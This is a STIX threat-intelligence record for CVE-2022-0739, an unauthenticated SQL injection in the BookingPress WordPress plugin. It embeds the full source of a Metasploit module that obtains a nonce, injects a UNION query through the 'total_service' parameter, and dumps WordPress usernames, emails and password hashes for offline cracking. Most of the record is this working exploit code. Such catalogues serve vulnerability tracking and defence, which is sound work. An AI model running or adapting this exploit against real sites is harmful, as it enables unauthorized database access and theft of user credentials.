{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--906b0301-3d56-4aaa-aeda-c2e8704ab484",
    "created": "2024-08-14T16:32:35.945112Z",
    "modified": "2024-08-14T16:32:35.945116Z",
    "name": "Wordpress BookingPress bookingpress_front_get_category_services SQLi",
    "description": " The BookingPress WordPress plugin before 1.0.11 fails to properly sanitize user supplied data in the `total_service` parameter of the `bookingpress_front_get_category_services` AJAX action (available to unauthenticated users), prior to using it in a dynamically constructed SQL query. As a result, unauthenticated attackers can conduct an SQL injection attack to dump sensitive data from the backend database such as usernames and password hashes.  This module uses this vulnerability to dump the list of WordPress users and their associated email addresses and password hashes for cracking offline. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/wp_bookingpress_category_services_sqli.rb",
            "external_id": "wp_bookingpress_category_services_sqli.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/destr4ct/CVE-2022-0739"
        },
        {
            "source_name": "WPVDB",
            "external_id": "388cd42d-b61a-42a4-8604-99b812db2357"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-0739"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::SQLi\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  NONCE_NOT_FOUND_ERROR_MSG = 'Unable to get wp-nonce as an unauthenticated user'.freeze\n  GET_SQLI_OBJECT_FAILED_ERROR_MSG = 'Unable to successfully retrieve an SQLi object'.freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Wordpress BookingPress bookingpress_front_get_category_services SQLi',\n        'Description' => %q{\n          The BookingPress WordPress plugin before 1.0.11 fails to properly sanitize user supplied data\n          in the `total_service` parameter of the `bookingpress_front_get_category_services` AJAX action\n          (available to unauthenticated users), prior to using it in a dynamically constructed SQL query.\n          As a result, unauthenticated attackers can conduct an SQL injection attack to dump sensitive\n          data from the backend database such as usernames and password hashes.\n\n          This module uses this vulnerability to dump the list of WordPress users and their associated\n          email addresses and password hashes for cracking offline.\n        },\n        'Author' => [\n          'cydave', # Of cyllective. Discovery of bug.\n          'destr4ct', # PoC Code for exploiting the bug.\n          'jheysel-r7' # Metasploit module\n        ],\n        'References' => [\n          [ 'URL', 'https://github.com/destr4ct/CVE-2022-0739'],\n          [ 'WPVDB', '388cd42d-b61a-42a4-8604-99b812db2357'],\n          [ 'CVE', '2022-0739']\n        ],\n        'License' => MSF_LICENSE,\n        'DisclosureDate' => '2022-02-28',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [ true, 'The URL of the BookingPress appointment booking page', '/bookingpress/' ])\n    ])\n  end\n\n  def check\n    @nonce = get_user_nonce\n    return Exploit::CheckCode::Unknown(NONCE_NOT_FOUND_ERROR_MSG) if @nonce == NONCE_NOT_FOUND_ERROR_MSG\n\n    @sqli = get_sqli_object\n    return Exploit::CheckCode::Unknown(GET_SQLI_OBJECT_FAILED_ERROR_MSG) if @sqli == GET_SQLI_OBJECT_FAILED_ERROR_MSG\n    return Exploit::CheckCode::Vulnerable if @sqli.test_vulnerable\n\n    Exploit::CheckCode::Safe\n  end\n\n  def generate_vars_post(sqli)\n    {\n      'action' => 'bookingpress_front_get_category_services', # Vulnerable AJAX action\n      '_wpnonce' => @nonce,\n      'category_id' => 1,\n      'total_service' => \"#{rand(100..10000)}#{sqli}\"\n    }\n  end\n\n  def get_sqli_object\n    create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true }) do |payload|\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => normalize_uri('/wp-admin/admin-ajax.php'),\n        'vars_post' =>\n            generate_vars_post(\") UNION ALL SELECT (#{payload}),456,789,12,34,56,78,90,77 from wp_users-- -\")\n      })\n\n      if res && res.code == 200\n        json_doc = res.get_json_document\n        if json_doc.blank? || json_doc[0].blank?\n          print_error('Could not parse the JSON response returned from the SQLi attempt!')\n          return GET_SQLI_OBJECT_FAILED_ERROR_MSG\n        end\n\n        json_parsed_doc = json_doc[0]['bookingpress_service_id']\n        if json_parsed_doc.blank?\n          print_error('Was able to parse the JSON response but no bookingpress_service_id field was found!')\n          return GET_SQLI_OBJECT_FAILED_ERROR_MSG\n        end\n\n        json_parsed_doc\n      elsif res\n        print_error(\"Unexpected response code encountered when conducting the SQLi attempt: #{res.code}\")\n        return GET_SQLI_OBJECT_FAILED_ERROR_MSG\n      else\n        print_error('No response from SQLi attempt')\n        return GET_SQLI_OBJECT_FAILED_ERROR_MSG\n      end\n    end\n  end\n\n  def get_user_nonce\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(datastore['TARGETURI'])\n    })\n\n    return NONCE_NOT_FOUND_ERROR_MSG unless res&.body&.match(\"_wpnonce:'(\\\\w+)'\\\\s*};\")\n\n    ::Regexp.last_match(1)\n  end\n\n  def run\n    @nonce ||= get_user_nonce\n    fail_with(Failure::UnexpectedReply, NONCE_NOT_FOUND_ERROR_MSG) if @nonce == NONCE_NOT_FOUND_ERROR_MSG\n    @sqli ||= get_sqli_object\n    fail_with(Failure::UnexpectedReply, GET_SQLI_OBJECT_FAILED_ERROR_MSG) if @sqli == GET_SQLI_OBJECT_FAILED_ERROR_MSG\n\n    creds_table = Rex::Text::Table.new(\n      'Header' => 'Wordpress User Credentials',\n      'Indent' => 1,\n      'Columns' => ['Username', 'Email', 'Hash']\n    )\n\n    print_status('Extracting credential information')\n    users = @sqli.dump_table_fields('wp_users', %w[user_login user_email user_pass])\n\n    users.each do |(username, email, hash)|\n      creds_table << [username, email, hash]\n      create_credential({\n        workspace_id: myworkspace_id,\n        origin_type: :service,\n        module_fullname: fullname,\n        username: username,\n        private_type: :nonreplayable_hash,\n        jtr_format: Metasploit::Framework::Hashes.identify_hash(hash),\n        private_data: hash,\n        service_name: 'WordPress BookingPress Plugin',\n        address: datastore['RHOSTS'],\n        port: datastore['RPORT'],\n        protocol: 'tcp',\n        status: Metasploit::Model::Login::Status::UNTRIED,\n        email: email\n      })\n    end\n    print_line creds_table.to_s\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-02-28"
}